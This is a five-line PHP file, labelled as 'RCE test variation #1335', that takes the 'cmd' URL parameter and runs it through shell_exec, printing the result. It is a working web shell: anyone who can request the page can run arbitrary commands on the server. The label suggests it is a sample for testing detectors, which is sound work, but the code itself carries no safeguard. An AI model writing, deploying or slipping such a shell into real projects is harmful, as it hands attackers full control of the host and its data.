<?php
// RCE test variation #1335
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>